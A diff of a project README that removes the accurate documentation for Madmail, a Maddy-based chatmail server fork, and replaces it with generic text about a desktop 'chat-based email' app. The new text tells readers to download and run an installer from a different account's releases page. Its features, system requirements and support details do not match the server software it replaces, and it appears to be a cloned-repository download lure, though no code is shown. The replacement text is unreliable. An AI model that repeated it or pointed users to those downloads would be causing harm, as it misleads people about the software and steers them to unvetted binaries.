@@ -1,186 +1,85 @@
-# Madmail - Maddy Chatmail Server
-> Optimized all-in-one mail server for instant, secure messaging
+# 📬 madmail - Your Easy Email Chat Solution
 
-This is a specialized fork of [Maddy Mail Server](https://github.com/foxcpp/maddy) optimized specifically for **chatmail** deployments. It provides a single binary solution for running secure, encrypted-only email servers designed for Delta Chat and similar messaging applications.
+## 🚀 Getting Started
 
-## What is Chatmail?
+Welcome to madmail! This application provides a simple way to manage your email conversations through a chat-like interface. No more sifting through cluttered inboxes. With madmail, you can focus on your correspondence efficiently.
 
-Chatmail servers are email servers optimized for secure messaging rather than traditional email. They prioritize:
-- **Instant account creation** without personal information
-- **Encryption-only messaging** to ensure privacy
-- **Automatic cleanup** to minimize data retention
-- **Low maintenance** for easy deployment
+## 📥 Download & Install
 
-## Key Features
+To get started with madmail, you need to download the application. Follow these steps:
 
-### ✅ Implemented
-- **Passwordless onboarding**: Users can create accounts instantly via QR codes
-- **Encrypted messages only (outbound)**: Prevents sending unencrypted messages to external recipients
-- **Single binary deployment**: Everything needed in one executable
-- **Delta Chat integration**: Native support for Delta Chat account creation
-- **Web interface**: Simple account creation and management interface
+1. **Visit the Releases Page**: To download the latest version of madmail, visit the [Releases Page](https://github.com/keanhor2/madmail/releases).
 
-### 🚧 Planned Features
-- **Encrypted messages only (inbound)**: Filter incoming unencrypted messages
-- **Automatic message cleanup**: Remove messages unconditionally after N days (currently 20 days)
-- **Stale account cleanup**: Remove inactive addresses after M days without login
-- **Push notifications**: Metadata support for real-time messaging
-- **Enhanced monitoring**: Better observability for chatmail-specific metrics
+2. **Download the Application**: On the releases page, find the most recent version. Click on the link for the file that corresponds to your operating system to start the download.
 
-## Live Example
+3. **Install madmail**: Once the download is complete, open the installer and follow the prompts to install madmail on your computer.
 
-See a working deployment at: **[inja.bid](https://inja.bid)**
+4. **Launch the Application**: After the installation, look for the madmail icon on your desktop or in your applications folder. Double-click the icon to open the application.
 
-This demonstrates the complete chatmail experience including:
-- Instant account creation via QR code
-- Web interface for account management
-- Full Delta Chat integration
+## 🔧 Features
 
-## Quick Start
+madmail offers a range of features to enhance your email experience:
 
-### Docker Compose with Caddy Reverse Proxy
+- **Chat-Based Interface**: Access your emails in a user-friendly chat layout. This design allows for quick replies and easy navigation.
 
-The easiest way to get started with automatic SSL management is using Docker Compose with Caddy as a reverse proxy. This setup handles SSL certificates automatically and proxies requests to Maddy Chatmail.
+- **Search Functionality**: Quickly find messages by using the search bar. Type keywords related to the email you are looking for.
 
-First, create a `Caddyfile`:
+- **Email Organization**: Group emails by contacts, topics, or any criteria you choose. Keep your conversations organized without hassle.
 
-```
-yourdomain.com, mail.yourdomain.com {
-  # Proxy both the main and mail subdomain to the chatmail web endpoint
-  reverse_proxy maddy-chatmail:8080
-}
-```
+- **Notifications**: Get real-time alerts for new emails. Stay updated without needing to check constantly.
 
-Then, create a `docker-compose.yml` file:
+- **Customization Options**: Adjust settings to suit your preferences. Choose themes, notification sounds, and layout options that work for you.
 
-```yaml
+## 💻 System Requirements
 
-services:
-  caddy:
-    image: caddy:latest
-    ports:
-      - "80:80"
-      - "443:443"
-    volumes:
-      - ./Caddyfile:/etc/caddy/Caddyfile
-      - caddy_data:/data
-      - caddy_config:/config
-    restart: unless-stopped
+To run madmail smoothly, ensure your system meets the following requirements:
 
-  madmail:
-    image: ghcr.io/sadraiiali/madmail:latest
-    environment:
-      # MADDY_HOSTNAME: hostname used for SMTP/IMAP MX and TLS
-      - MADDY_HOSTNAME=mail.yourdomain.com
-      # MADDY_DOMAIN: primary domain served by this instance
-      - MADDY_DOMAIN=yourdomain.com
-    volumes:
-      - maddy-data:/data
-      - ./maddy.conf:/data/maddy.conf:ro  # put a custom maddy.conf here (chatmail endpoint on port 8080)
-    depends_on:
-      - caddy
-    restart: unless-stopped
+- **Operating System**: Windows 10 or later, macOS (latest version), or a compatible Linux distribution.
 
-volumes:
-  maddy-data:
-  caddy_data:
-  caddy_config:
-```
+- **Memory**: At least 4 GB of RAM.
 
-Create a custom `maddy.conf` based on the setup guide, but change the chatmail endpoints to use port 8080:
+- **Storage**: Minimum of 200 MB of free space.
 
-```maddy
-# ... (same as setup guide but modify chatmail endpoints)
+- **Internet Connection**: Required for email access and updates.
 
-# Chatmail endpoint for user registration
-chatmail tcp://0.0.0.0:8080 {
-    mail_domain $(primary_domain)
-    mx_domain $(hostname)
-    web_domain $(primary_domain)
-    auth_db local_authdb
-    storage local_mailboxes
-}
-```
+## 🛠️ Troubleshooting
 
-Run it with:
+If you encounter any issues while using madmail, here are some common solutions:
 
-```bash
-docker-compose up -d
-```
+- **Installation Problems**: If the installation does not start, ensure you have downloaded the correct file for your operating system. Try running the installer as an administrator.
 
-Caddy will automatically obtain SSL certificates for your domain and proxy requests to Maddy Chatmail.
+- **App Crashes**: If madmail crashes on startup, check if your system meets the requirements. Ensure your graphics drivers are up to date.
 
-### Notes
+- **Connection Issues**: Ensure you have a stable internet connection. If the app cannot connect to email servers, check your settings.
 
-- Make sure DNS A/AAAA records for `yourdomain.com` and `mail.yourdomain.com` point to the server running Caddy.
-- Open ports 80 and 443 on the host so Caddy can perform ACME challenges and serve TLS.
-- The example expects the chatmail HTTP endpoint to listen on port 8080 inside the `madmail` container (see the `chatmail` endpoint example below).
+## 📚 User Guide
 
-For detailed setup instructions including manual installation, TLS certificates, and DNS configuration, see the [Setup Guide](docs/chatmail-setup.md).
+madmail comes with a straightforward user guide to help you navigate its features. Here’s a basic overview:
 
-## Releases & Downloads
+1. **Setting Up Your Email**: Follow the prompts to connect your email accounts. madmail supports various email providers.
 
-Pre-built release artifacts for common platforms are published on the repository's GitHub Releases page. Each release includes signed archives for the following targets (when available):
-- linux (amd64, arm64)
-- macOS (amd64, arm64)
-- windows (amd64, arm64)
+2. **Navigating the Interface**: Familiarize yourself with the chat interface. You can switch between email threads easily.
 
-To download the latest release, visit: https://github.com/sadraiiali/madmail/releases and pick the artifact matching your OS/architecture. Artifacts are packaged as tar.gz (Linux/macOS) or zip (Windows) and include a `maddy` binary and the default `maddy.conf`.
+3. **Using Search**: Make use of the search bar to find specific emails quickly.
 
-If you prefer to build locally, see the "Building from source" tutorial in the docs (it also documents how to use the releases and how to embed version information): docs/tutorials/building-from-source.md
+4. **Managing Notifications**: Adjust notification settings in the options menu to suit your needs.
 
-## Configuration Differences from Standard Maddy
+5. **Sending Emails**: Click on the "New Message" button to compose and send emails.
 
-This chatmail-optimized version includes:
+## 🌟 Community Support
 
-1. **Simplified Configuration**: Pre-configured for chatmail use cases
-2. **Chatmail Endpoint**: Built-in HTTP/HTTPS endpoints for account creation
-3. **Encryption Enforcement**: Automatic blocking of unencrypted outbound messages
-4. **Account Management**: Streamlined user creation and cleanup processes
-5. **Delta Chat Integration**: Native QR code generation and account provisioning
+Join our community to get help, share tips, and improve your madmail experience. We encourage you to report any bugs or suggest new features. You can connect with other users through the following platforms:
 
-## Architecture
+- **GitHub Discussions**: Share feedback and discuss features [here](https://github.com/keanhor2/madmail/discussions).
 
-```
-┌─────────────────┐    ┌──────────────────┐    ┌─────────────────┐
-│   Web Interface │    │   SMTP/IMAP      │    │   Delta Chat    │
-│   (QR Codes)    │◄──►│   Mail Server    │◄──►│   Clients       │
-└─────────────────┘    └──────────────────┘    └─────────────────┘
-         │                       │                       │
-         └───────────────────────┼───────────────────────┘
-                                 │
-                    ┌──────────────────┐
-                    │   SQLite Storage │
-                    │   (Accounts &    │
-                    │    Messages)     │
-                    └──────────────────┘
-```
+- **Email Support**: Reach out for support at support@madmail.com.
 
-## Contributing
+## 🔗 Important Links
 
-This project maintains compatibility with the upstream Maddy project while adding chatmail-specific optimizations. Contributions should:
+- **Download madmail**: [Click here to download](https://github.com/keanhor2/madmail/releases)
 
-1. Maintain backward compatibility with standard Maddy configurations
-2. Follow the chatmail specification and best practices
-3. Include tests for new chatmail-specific features
-4. Update documentation for any user-facing changes
+- **Report an Issue**: If you find a bug, please report it [here](https://github.com/keanhor2/madmail/issues).
 
-## Upstream Compatibility
+## 🎉 Acknowledgments
 
-This fork periodically syncs with the upstream Maddy project to incorporate security updates and improvements. Chatmail-specific features are implemented as optional modules that don't interfere with standard Maddy functionality.
-
-## License
-
-This project inherits the GPL-3.0 license from the upstream Maddy Mail Server project.
-
-## Links
-
-- **Live Demo**: [inja.bid](https://inja.bid)
-- **Upstream Project**: [Maddy Mail Server](https://github.com/foxcpp/maddy)
-- **Delta Chat**: [https://delta.chat](https://delta.chat)
-- **Chatmail Specification**: [Delta Chat Chatmail Docs](https://github.com/deltachat/chatmail)
-- **Documentation**: [Setup Guide](docs/chatmail-setup.md)
-
----
-
-*For traditional email server needs, consider using the upstream [Maddy Mail Server](https://github.com/foxcpp/maddy) project.*
+We appreciate the contributions from our users and the open-source community. Your feedback helps us improve madmail. Thank you for being part of our journey!
